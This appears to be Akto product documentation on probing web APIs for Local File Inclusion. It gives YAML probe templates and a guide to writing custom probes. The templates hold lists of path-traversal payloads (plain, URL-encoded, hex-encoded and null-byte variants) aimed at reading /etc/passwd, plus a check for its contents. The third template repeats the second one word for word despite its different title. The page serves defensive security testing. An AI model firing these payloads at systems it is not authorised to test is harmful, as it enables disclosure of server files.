---
description: >-
  This page is about probing for Local File Inclusion using Akto's custom probe
  templates
---

# Local File Inclusion with Akto

## **What is Local file inclusion?**

Local File Inclusion (LFI) is a vulnerability that allows an attacker to include files, usually residing on the server, within the output of a given application. LFI attacks can lead to full server compromise if configured with improper permissions. Such vulnerabilities are typically found in applications that do not properly validate user-supplied input for file inclusion functionalities.

## **The Importance of Local file inclusion Probing**

For organizations, LFI vulnerabilities can lead to sensitive information exposure, unauthorized system access, and even potential server compromises. Therefore, conducting LFI probes as part of a regular security audit is crucial to ensure the safety and integrity of web applications.

## **Local file inclusion Probe Examples in Akto**

Akto offers an array of pre-configured LFI probes designed for comprehensive coverage against potential vulnerabilities.

### **Pre-configured Local File Inclusion Probes:**

1. **Local File Inclusion in Parameter:** You can try this probe in [Akto’s Agentic AI Security playground](https://www.akto.io/test/lfi-in-parameter).

```yaml
id: LFI_IN_PARAMETER
info:
  name: "LFI in parameter"
  description: "File path fuzzing in query parameters and request body to identify potential Local File Inclusion vulnerabilities." 
  details: >
            "This probe  examines the presence of file path names in query parameters or request bodies, fuzzing them to identify potential Local File Inclusion vulnerabilities."
            "If exploited, LFI can lead to unauthorized access, information disclosure, server compromise, and execution of malicious code, posing significant risks to the application and its users."
  impact: "Successful exploitation allows an attacker to read arbitrary files on a web server, potentially leading to unauthorized access, information disclosure, server compromise, and execution of malicious code."
  category:
    name: LFI
    shortName: Local File Inclusion
    displayName: Local File Inclusion (LFI)
  subCategory: LFI_IN_PARAMETER
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "<https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion>"
    - "<https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt>"
api_selection_filters:
  or:
    - request_payload:
        for_one:
          value:
            regex: ^.*\\..{1,4}$
          key:
            extract: file_path
    - query_param:
        for_one:
          value:
            regex: ^.*\\..{1,4}$
          key:
            extract: file_path

wordLists:
  filePaths: 
    - /etc/passwd
    - /etc/npasswd
    - ..//etc/passwd
    - ../..//etc/passwd
    - ../../..//etc/passwd
    - ../../../..//etc/passwd
    - ../../../../..//etc/passwd
    - ../../../../../..//etc/passwd
    - ..%2f/etc/passwd
    - ..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
    - ..\\/etc/passwd
    - ..\\..\\/etc/passwd
    - ..\\..\\..\\/etc/passwd
    - ..\\..\\..\\..\\/etc/passwd
    - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/..//etc/passwd
    - 0x2e0x2e//etc/passwd
    - 0x2e0x2e/0x2e0x2e//etc/passwd
    - ..0x2f/etc/passwd
    - ..0x2f..0x2f/etc/passwd
    - ..0x2f..0x2f..0x2f/etc/passwd
    - ..///etc/passwd
    - ..//..///etc/passwd
    - ..//..//..///etc/passwd
    - .\\\\..\\\\/etc/passwd
    - .\\\\..\\\\.\\\\..\\\\/etc/passwd
    - ../../../../../../../../../../../../etc/passwd%00

execute:
  type: single
  requests:
    - req:
      - modify_query_param:
          file_path : ${filePaths}
      - modify_body_param:
          file_path: ${filePaths}

validate:
  response_payload:
    regex: "root:.*:0:0:"
```

2. **Local File Inclusion by adding new parameter:** You can try this probe in [Akto’s Agentic AI Security playground](https://www.akto.io/test/lfi-by-adding-new-parameter).

```yaml
id: FILE_INCLUSION_NEW_PARAM
info:
  name: "LFI by adding new parameter"
  description: "This probe  evaluates the vulnerability of a web application to Local File Inclusion by introducing new parameters for potential file path manipulation" 
  details: >
            "Assesses the vulnerability of a web application to Local File Inclusion by introducing additional parameters for potential file path manipulation."
            "This probe  aims to identify any weaknesses that may allow an attacker to access sensitive files, leading to unauthorized data disclosure, server compromise, and potential execution of malicious code. It helps ensure the application's security and protect against LFI attacks"
  impact: "Successful exploitation allows an attacker to read arbitrary files on a web server, potentially leading to unauthorized access, information disclosure, server compromise, and execution of malicious code."
  category:
    name: LFI
    shortName: Local File Inclusion
    displayName: Local File Inclusion (LFI)
  subCategory: FILE_INCLUSION_NEW_PARAM
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "<https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion>"
    - "<https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt>"
api_selection_filters:
  response_code:
    gte: 200
    lt: 300

  method:
    contains_either:
      - "GET"

wordLists:
  filePaths: 
    - /etc/passwd
    - /etc/npasswd
    - ..//etc/passwd
    - ../..//etc/passwd
    - ../../..//etc/passwd
    - ../../../..//etc/passwd
    - ../../../../..//etc/passwd
    - ../../../../../..//etc/passwd
    - ..%2f/etc/passwd
    - ..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
    - ..\\/etc/passwd
    - ..\\..\\/etc/passwd
    - ..\\..\\..\\/etc/passwd
    - ..\\..\\..\\..\\/etc/passwd
    - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/..//etc/passwd
    - 0x2e0x2e//etc/passwd
    - 0x2e0x2e/0x2e0x2e//etc/passwd
    - ..0x2f/etc/passwd
    - ..0x2f..0x2f/etc/passwd
    - ..0x2f..0x2f..0x2f/etc/passwd
    - ..///etc/passwd
    - ..//..///etc/passwd
    - ..//..//..///etc/passwd
    - .\\\\..\\\\/etc/passwd
    - .\\\\..\\\\.\\\\..\\\\/etc/passwd
    - ../../../../../../../../../../../../etc/passwd%00

execute:
  type: single
  requests:
    - req:
      - add_query_param:
          file: ${filePaths}
      - add_query_param:
          files: ${filePaths}
      - add_query_param:
          filePath: ${filePaths}
      - add_query_param:
          file_path: ${filePaths}
      - add_query_param:
          previewFilePath: ${filePaths}
      - add_query_param:
          controller: ${filePaths}
      - add_query_param:
          filename: ${filePaths}
      - add_query_param:
          page: ${filePaths}
      - add_query_param:
          sub_page: ${filePaths}
      - add_query_param:
          href: ${filePaths}
      - add_query_param:
          fn: ${filePaths}
      - add_query_param:
          module: ${filePaths}

validate:
  response_payload:
    regex: "root:.*:0:0:"
```

3. **Local File Inclusion in path.yaml:** You can try this probe in the [Akto’s Agentic AI Security playground](https://www.akto.io/test/lfi-in-path).

```yaml
id: FILE_INCLUSION_NEW_PARAM
info:
  name: "LFI by adding new parameter"
  description: "This probe  evaluates the vulnerability of a web application to Local File Inclusion by introducing new parameters for potential file path manipulation" 
  details: >
            "Assesses the vulnerability of a web application to Local File Inclusion by introducing additional parameters for potential file path manipulation."
            "This probe  aims to identify any weaknesses that may allow an attacker to access sensitive files, leading to unauthorized data disclosure, server compromise, and potential execution of malicious code. It helps ensure the application's security and protect against LFI attacks"
  impact: "Successful exploitation allows an attacker to read arbitrary files on a web server, potentially leading to unauthorized access, information disclosure, server compromise, and execution of malicious code."
  category:
    name: LFI
    shortName: Local File Inclusion
    displayName: Local File Inclusion (LFI)
  subCategory: FILE_INCLUSION_NEW_PARAM
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "<https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion>"
    - "<https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt>"
api_selection_filters:
  response_code:
    gte: 200
    lt: 300

  method:
    contains_either:
      - "GET"

wordLists:
  filePaths: 
    - /etc/passwd
    - /etc/npasswd
    - ..//etc/passwd
    - ../..//etc/passwd
    - ../../..//etc/passwd
    - ../../../..//etc/passwd
    - ../../../../..//etc/passwd
    - ../../../../../..//etc/passwd
    - ..%2f/etc/passwd
    - ..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
    - ..\\/etc/passwd
    - ..\\..\\/etc/passwd
    - ..\\..\\..\\/etc/passwd
    - ..\\..\\..\\..\\/etc/passwd
    - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/..//etc/passwd
    - 0x2e0x2e//etc/passwd
    - 0x2e0x2e/0x2e0x2e//etc/passwd
    - ..0x2f/etc/passwd
    - ..0x2f..0x2f/etc/passwd
    - ..0x2f..0x2f..0x2f/etc/passwd
    - ..///etc/passwd
    - ..//..///etc/passwd
    - ..//..//..///etc/passwd
    - .\\\\..\\\\/etc/passwd
    - .\\\\..\\\\.\\\\..\\\\/etc/passwd
    - ../../../../../../../../../../../../etc/passwd%00

execute:
  type: single
  requests:
    - req:
      - add_query_param:
          file: ${filePaths}
      - add_query_param:
          files: ${filePaths}
      - add_query_param:
          filePath: ${filePaths}
      - add_query_param:
          file_path: ${filePaths}
      - add_query_param:
          previewFilePath: ${filePaths}
      - add_query_param:
          controller: ${filePaths}
      - add_query_param:
          filename: ${filePaths}
      - add_query_param:
          page: ${filePaths}
      - add_query_param:
          sub_page: ${filePaths}
      - add_query_param:
          href: ${filePaths}
      - add_query_param:
          fn: ${filePaths}
      - add_query_param:
          module: ${filePaths}

validate:
  response_payload:
    regex: "root:.*:0:0:"
```

**3. How to Write Your Own LFI Probe in Akto**

Creating a custom LFI probe in Akto not only allows for tailored security checks but also ensures that specific behaviors of your application are evaluated. Here's a detailed guide with an example:

Step 1: Navigate to probe editor

Step 2: Start with a base template:

```yaml
id: CUSTOM_PROBE_ID
info:
  name: "Your Probe Name"
  description: "Brief description of your probe."
details: >
        "Detailed description or logic behind your probe."
impact: "Potential impact of the vulnerability if exploited."
category:
    name: LFI
    shortName: Local File Inclusion
    displayName: Local File Inclusion (LFI)
subCategory: CUSTOM_SUB_CATEGORY_NAME
severity: YOUR_SEVERITY_LEVEL
tags:
    - Your
    - Tags
    - Here
references:
    - "Relevant reference link"
api_selection_filters: YOUR_FILTERS_HERE
wordLists: YOUR_PAYLOADS_HERE
execute: YOUR_EXECUTION_METHOD_HERE
validate: YOUR_VALIDATION_METHOD_HERE
```

Step 3: Customizing the Base Template

### **Example: Local File Inclusion Using Backup Files**

We'll create a probe that detects if backup files are accessible, a common oversight leading to LFI:

```yaml
id: LFI_BACKUP_FILES
info:
  name: "LFI via Backup Files"
  description: "Checks for accessible backup files which can be exploited for LFI." 
details: >
        "Backup files, if improperly secured, can be used by attackers to extract information or compromise a server. This probe attempts to access popular backup file formats."
impact: "Exposure of sensitive information and potential system compromise."
category:
    name: LFI
    shortName: Local File Inclusion
    displayName: Local File Inclusion (LFI)
subCategory: LFI_Backup_Access
severity: HIGH
tags:
    - Backup
    - Misconfiguration
references:
    - "<https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion>"
api_selection_filters:
  or:
    - request_payload:
        for_one:
          value:
            regex: ^.*\\..{1,4}$
          key:
            extract: backup_file_path
wordLists: 
  backupFiles: 
    - backup.sql
    - backup.zip
    - backup.tar.gz
    - config.php.bak
    - index.html~ 
execute:
  type: single
  requests:
    - req:
      - modify_request_payload:
          backup_file_path : ${backupFiles}
validate:
  response_payload:
    regex: "Sensitive_Keyword_or_Regex_Here"
```

Step 4: **Save & Execute.** After customizing the base template for your probe, click **`Save`**.

Step 5: Enter the componente you want to probe. Click **`Run Probe`**

Step 6: Refine your custom probe as necessary based on the outcomes.

Using Akto's powerful customization capabilities, you can now confidently construct and run bespoke LFI probes tailored to your application's unique behaviors and potential vulnerabilities. Always ensure probes are run in safe environments to avoid unintended impacts.
